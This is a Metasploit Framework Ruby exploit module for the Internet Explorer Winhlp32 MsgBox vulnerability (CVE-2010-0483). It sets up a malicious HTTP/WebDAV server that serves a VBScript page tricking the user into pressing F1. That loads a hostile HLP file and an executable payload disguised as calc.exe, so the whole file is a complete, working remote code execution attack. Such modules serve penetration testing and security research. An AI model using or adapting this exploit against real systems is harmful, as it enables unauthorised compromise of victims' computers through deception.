##
# $Id: ms10_022_ie_vbscript_winhlp32.rb 10504 2010-09-28 16:19:50Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer Winhlp32.exe MsgBox Code Execution',
			'Description'    => %q{
					This module exploits a code execution vulnerability that occurs when a user
				presses F1 on MessageBox originated from VBscript within a web page. When the
				user hits F1, the MessageBox help functionaility will attempt to load and use
				a HLP file from an SMB or WebDAV (if the WebDAV redirector is enabled) server.

				This particular version of the exploit implements a WebDAV server that will
				serve HLP file as well as a payload EXE. During testing warnings about the
				payload EXE being unsigned were witnessed. A future version of this module
				might use other methods that do not create such a warning.
			},
			'Author'         =>
				[
					'Maurycy Prodeus',   # Original discovery
					'jduck'              # Metasploit version
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10504 $',
			'References'     =>
				[
					[ 'CVE', '2010-0483' ],
					[ 'OSVDB', '62632' ],
					[ 'MSB', 'MS10-023' ],
					[ 'URL', 'http://www.microsoft.com/technet/security/advisory/981169.mspx' ],
					[ 'URL', 'http://blogs.technet.com/msrc/archive/2010/02/28/investigating-a-new-win32hlp-and-internet-explorer-issue.aspx' ],
					[ 'URL', 'http://isec.pl/vulnerabilities/isec-0027-msgbox-helpfile-ie.txt' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Compat' =>
					{
						'ConnectionType' => '-find',
					}
				},
			'Platform'       => 'win',

			# Tested OK - Windows XP SP3 - jjd
			'Targets'        =>
				[
					[ 'Automatic', { } ],

					[ 'Internet Explorer on Windows',
						{
							# nothing here
						}
					]
				],
			'DisclosureDate' => 'Feb 26 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The daemon port to listen on", 80 ]),
				OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
			], self.class)
	end


	def auto_target(cli, request)
		agent = request.headers['User-Agent']

		ret = nil
		# Check for MSIE and/or WebDAV redirector requests
		if agent =~ /(Windows NT 6\.0|MiniRedir\/6\.0)/
			ret = targets[1]
		elsif agent =~ /(Windows NT 5\.1|MiniRedir\/5\.1)/
			ret = targets[1]
		elsif agent =~ /(Windows NT 5\.2|MiniRedir\/5\.2)/
			ret = targets[1]
		elsif agent =~ /MSIE 7\.0/
			ret = targets[1]
		elsif agent =~ /MSIE 6\.0/
			ret = targets[1]
		else
			print_status("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end

		ret
	end


	def on_request_uri(cli, request)

		mytarget = target
		if target.name == 'Automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		# If there is no subdirectory in the request, we need to redirect.
		if (request.uri == '/') or not (request.uri =~ /\/[^\/]+\//)
			if (request.uri == '/')
				subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'
			else
				subdir = request.uri + '/'
			end
			print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
			send_redirect(cli, subdir)
			return
		end

		# dispatch WebDAV requests based on method first
		case request.method
		when 'OPTIONS'
			process_options(cli, request, mytarget)

		when 'PROPFIND'
			process_propfind(cli, request, mytarget)

		when 'GET'
			process_get(cli, request, mytarget)

		when 'PUT'
			print_status("Sending 404 for PUT #{request.uri} ...")
			send_not_found(cli)

		else
			print_error("Unexpected request method encountered: #{request.method}")

		end

	end


	#
	# GET requests
	#
	def process_get(cli, request, target)

		print_status("Responding to GET request from #{cli.peerhost}:#{cli.peerport}")
		# dispatch based on extension
		if (request.uri =~ /\.hlp$/i)
			#
			# HLP requests sent by IE and the WebDav Mini-Redirector
			#
			print_status("Sending HLP to #{cli.peerhost}:#{cli.peerport}...")
			# Transmit the compressed response to the client
			send_response(cli, generate_hlp(target), { 'Content-Type' => 'application/octet-stream' })

		elsif (request.uri =~ /calc\.exe$/i)
			#
			# send the EXE
			#
			print_status("Sending EXE to #{cli.peerhost}:#{cli.peerport}...")
			# Re-generate the payload
			return if ((p = regenerate_payload(cli)) == nil)
			exe = generate_payload_exe({ :code => p.encoded })
			send_response(cli, exe, { 'Content-Type' => 'application/octet-stream' })

		else
			#
			# HTML requests sent by IE and Firefox
			#
			my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
			name = rand_text_alphanumeric(rand(8)+8)
			#path = get_resource.gsub(/\//, '\\')
			path = request.uri.gsub(/\//, '\\')
			unc = '\\\\' + my_host + path + name + '.hlp'
			print_status("Using #{unc} ...")
			html = %Q|<html>
<script type="text/vbscript">
MsgBox "Welcome!  Press F1 to dismiss this dialog.", ,"Welcome!", "#{unc}", 1
</script>
</html>
|
			print_status("Sending HTML page to #{cli.peerhost}:#{cli.peerport}...")
			send_response(cli, html)

		end
	end


	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request, target)
		print_status("Responding to WebDAV OPTIONS request from #{cli.peerhost}:#{cli.peerport}")
		headers = {
			#'DASL'   => '<DAV:sql>',
			#'DAV'    => '1, 2',
			'Allow'  => 'OPTIONS, GET, PROPFIND',
			'Public' => 'OPTIONS, GET, PROPFIND'
		}
		send_response(cli, '', headers)
	end


	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request, target)
		path = request.uri
		print_status("Received WebDAV PROPFIND request from #{cli.peerhost}:#{cli.peerport}")
		body = ''

		if (path =~ /calc\.exe$/i)
			# Uncommenting the following will use the target system's calc (as specified in the .hlp)
			#print_status("Sending 404 for #{path} ...")
			#send_not_found(cli)
			#return

			# Response for the EXE
			print_status("Sending EXE multistatus for #{path} ...")
#<lp1:getcontentlength>45056</lp1:getcontentlength>
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0132-b000-43c6e5f8d2f80"</lp1:getetag>
<lp2:executable>F</lp2:executable>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
		elsif (path =~ /\.hlp/i)
			print_status("Sending HLP multistatus for #{path} ...")
			body = %Q|<?xml version="1.0"?>
<a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:">
<a:response>
</a:response>
</a:multistatus>
|
		elsif (path =~ /\.manifest$/i) or (path =~ /\.config$/i) or (path =~ /\.exe/i)
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return

		elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
			# Response for anything else (generally just /)
			print_status("Sending directory multistatus for #{path} ...")
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

		else
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return

		end

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
	end


	#
	# Generate a HLP file that will trigger the vulnerability
	#
	def generate_hlp(target)
		@hlp_data
	end


	#
	# When exploit is called, load the runcalc.hlp file
	#
	def exploit
		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			raise RuntimeError, 'Using WebDAV requires SRVPORT=80 and URIPATH=/'
		end

		path = File.join(Msf::Config.install_root, "data", "exploits", "runcalc.hlp")
		fd = File.open(path, "rb")
		@hlp_data = fd.read(fd.stat.size)
		fd.close

		super
	end

end

